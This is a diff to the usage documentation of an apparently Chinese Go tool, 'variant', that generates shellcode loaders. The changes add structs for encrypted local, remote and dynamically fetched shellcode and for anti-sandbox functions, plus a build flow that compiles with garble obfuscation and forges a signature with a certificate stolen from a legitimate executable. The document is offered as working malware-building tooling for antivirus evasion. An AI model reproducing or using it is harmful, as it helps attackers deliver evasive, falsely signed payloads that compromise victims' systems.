@@ -11,7 +11,16 @@ Code Usage
 动态模板支持
 
 ```go
-type Data struct {
+package render
+
+type TmplOpts struct {
+	TmplFile     string      // 模板文件路径
+	OutputDir    string      // 输出目录路径
+	OutputGoName string      // 输出的 Go 文件名
+	Data         interface{} // 基础模板渲染数据
+}
+
+type TmplData struct {
 	CipherText string      // 保存加密文本的变量名
 	PlainText  string      // 保存解密文本的变量名
 	DLLibrary  interface{} // Dynamic Link Library - DLL
@@ -24,6 +33,70 @@ type Data struct {
 	Compressor interface{} // 压缩算法模块
 	Apart      interface{} // 分离加载模块
 	Dynamic    interface{} // 动态数据
+}
+
+type Loader struct {
+	Import string // 导入库
+	Method string // loader
+}
+
+type SandBox struct {
+	Import  string   // 导入库
+	Methods []string // 反沙箱函数
+}
+
+type Compressor struct {
+	Import    string // 导入库
+	Algorithm string // 压缩算法
+	Ratio     int    // lzw 压缩率, 一般为8
+}
+
+type Local struct {
+	KeyName      string      // Key 变量名
+	KeyValue     string      // Key 值
+	IvName       string      // Iv  变量名
+	IvValue      string      // Iv  值
+	Payload      interface{} // 加密 shellcode
+	DecryptLocal string      // 解密函数
+	MainLocal    string      // 本地加载方法名
+}
+
+type Remote struct {
+	Import     string // 导入库
+	Url        string // 远程加载Url
+	Method     string // 请求方法
+	UCFileCode string // UsersCloud加载的参数
+	UCMethod   string // 读取UsersCloud的Payload
+}
+
+type Dynamic struct {
+	Import         string // 导入库
+	DynamicUrl     string // 远程读取shellcode的url
+	DynamicMethod  string // 动态函数
+	MainDynamic    string // 动态加载函数名
+	DecryptDynamic string // 解密函数
+	KeyName        string // Key 变量名
+	HexValue       string // 动态获取的 Key & IV 的值集合
+	KeyStart       int    // Key 动态起始区间
+	KeyEnd         int    // Key 动态结束区间
+	IVName         string // IV 变量名
+	IVStart        int    // IV 动态起始区间
+	IVEnd          int    // IV 动态结束区间
+}
+
+type Args struct {
+	Import  string // 导入库
+	ArgsKey string // 参数加载设置的密钥
+}
+
+type Pokemon struct {
+	PokemonPayload []string // Pokemon 加密数组
+	MainPokemon    string   // Pokemon 函数名
+	DecryptPokemon string   // 解密函数
+}
+
+type DLLibrary struct {
+	DllFuncName string // 导出DLL函数名
 }
 ```
 
@@ -43,12 +116,16 @@ set GOGARBLE=*
 
 ```go
 // 基础参数：ldflags="-s -w -H=windowsgui" -trampath
+// GoCompile 使用GoCompiler进行编译
 func (c CompileOpts) GoCompile() error {
-	return c.compile("go")
+	comp := NewGoCompiler(c)
+	return c.compile(comp)
 }
 
+// GarbleCompile 使用GarbleCompiler进行编译
 func (c CompileOpts) GarbleCompile() error {
-	return c.compile("garble")
+	comp := NewGarbleCompiler(c)
+	return c.compile(comp)
 }
 ```
 
@@ -133,13 +210,10 @@ func (c CompileOpts) GarbleCompile() error {
 package main
 
 import (
-	"fmt"
-	"strings"
 	"variant/build"
 	"variant/compress"
 	"variant/crypto"
 	"variant/encoder"
-	"variant/gores"
 	"variant/log"
 	"variant/rand"
 	"variant/render"
@@ -148,6 +222,7 @@ import (
 func main() {
 	// 反沙箱模块
 	sandbox := render.SandBox{
+		Import: "variant/sandbox",
 		Methods: []string{
 			"sandbox.GetDesktopFiles",
 			"sandbox.BootTimeGetTime",
@@ -194,7 +269,7 @@ func main() {
 	}
 
 	// 定义模板渲染数据
-	data := render.Data{
+	data := render.TmplData{
 		CipherText: rand.RStrings(),
 		PlainText:  rand.RStrings(),
 		Loader:     load,
@@ -208,7 +283,7 @@ func main() {
 	tOpts := render.TmplOpts{
 		TmplFile:     "render/templates/v6/Base.tmpl",
 		OutputDir:    "output",
-		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
+		OutputGoName: build.RandomGoFileName(),
 		Data:         data,
 	}
 	// 生成模板
@@ -220,14 +295,14 @@ func main() {
 	// 编译参数
 	cOpts := build.CompileOpts{
 		GoFileName:  tOpts.OutputGoName,
-		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
+		ExeFileName: build.RenameGoTrimSuffix(tOpts.OutputGoName),
 		HideConsole: false,
 		CompilePath: "output",
 		BuildMode:   "pie",
 		Literals:    true,
 		GSeed:       true,
 		Tiny:        true,
-		GDebug:      true,
+		GDebug:      false,
 	}
 
 	// 编译
@@ -257,27 +332,27 @@ func main() {
 
 	// 伪造证书配置
 	ct := build.CertThief{
-		SignDir: "output",
-		SrcFile: cOpts.ExeFileName,
-		DstFile: "Code.exe",
-		Signed:  fmt.Sprintf("signed_%s", cOpts.ExeFileName),
-		DstCert: "Code.der",
+		SignDir:  "output",
+		SrcFile:  cOpts.ExeFileName,
+		DstFile:  "Code.exe",
+		SignedPE: build.RenameSignedPEName(cOpts.ExeFileName),
+		CertFile: "Code.der",
 	}
 
 	// 保存证书
-	err = ct.CertSaver()
+	err = ct.SaveCertificate()
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	// 利用EXE进行签名伪造
-	err = ct.ExeThief()
+	err = ct.SignExecutable()
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	// 利用证书进行签名伪造
-	err = sOpts.CertThief()
+	err = ct.SignWithStolenCert()
 	if err != nil {
 		log.Fatal(err)
 	}
